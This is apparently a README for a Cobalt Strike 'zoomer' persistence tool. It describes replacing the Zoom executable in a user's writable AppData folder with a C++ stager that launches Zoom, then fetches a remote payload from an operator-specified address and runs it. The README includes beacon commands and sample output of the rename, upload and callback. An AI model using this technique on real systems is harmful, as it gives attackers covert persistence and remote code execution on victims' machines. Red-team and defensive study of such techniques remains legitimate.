# Zoom Persistence via Symlink Abuse

## Background: 
By default Zoom gets installed under a User's "AppData" directory (C:\Users\{USER}\AppData\Roaming\Zoom\) which is writeable by the user in question. If the Zoom executable located in the the Zoom "bin" directory gets replaced with another. All the Symbolic links (short cuts) will point to the new exe.

## Functionality 
This script generates a C++ stager using the operator provided arguments (Compilation is currently handled by mingw and generates a 32bit exe). The script then renames the zoom executable on the filesystem to a user-defined name and uploads the stager to the zoom directory under the file name "zoom.exe".

This stager will then run the Zoom Executable using its modified name and then pull the stage from the specified address and execute it.

## IMPORTANT 

Modify the builder and compiler variables to point at the correct compiler executable names 

## Example Usage : 

```
beacon> zoomer 127.0.0.1 80 test 
```

## Sample Output :

```
beacon> zoomer 10.0.0.151 80 test ZoomClient.exe
[+] Building Stager to fetch from http://10.0.0.151:80/test
[+] Created New Stager Source C:\Users\S4R1N\source\repos\ZoomPersistence\Source\10.0.0.151_80_test.cpp
[+] Attempting to Compile Stager
[+] Return Code From Compiler: 0
[+] Renaming Zoom Client For S4R1N (c:\users\S4R1N\AppData\Roaming\Zoom\bin\zoom.exe) to ZoomClient.exe (c:\users\S4R1N\AppData\Roaming\Zoom\bin\ZoomClient.exe)
[*] Tasked beacon to run: rename c:\users\S4R1N\AppData\Roaming\Zoom\bin\zoom.exe ZoomClient.exe
[*] Tasked beacon to upload c:\users\S4R1N\AppData\Roaming\Zoom\bin\zoom.exe as c:\users\S4R1N\AppData\Roaming\Zoom\bin\zoom.exe
[+] host called home, sent: 81721 bytes
```
